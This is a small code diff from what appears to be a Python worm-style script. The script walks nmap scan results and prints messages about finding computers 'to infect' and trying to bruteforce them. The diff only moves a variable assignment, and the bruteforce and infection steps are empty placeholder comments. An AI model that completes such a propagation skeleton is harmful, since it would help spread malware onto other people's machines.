@@ -58,12 +58,13 @@ for entry in listedNmapString:
 	except:
 		errorOccured = True
 
+	bruteforced = False
+
 	if not errorOccured:
 		if dataDecoded != 'OK':
 			print('ErrorOccured = false, dataDecoded =/= OK')
 			print('Found a possible computer to infect. Trying to bruteforce the machine...')			
 			#Try to bruteforce the machine here
-			bruteforced = False
 			if brutedforced:
 				print('Infecting the machine...')
 				#Infect the machine here
@@ -74,7 +75,6 @@ for entry in listedNmapString:
 		print('ErrorOccured = true')
 		print('Found a possible computer to infect. Trying to infect the machine...')
 		#Try to infect machine here
-		bruteforced = False
 		if brutedforced:
 			print('Infecting the machine...')
 			#Infect the machine here
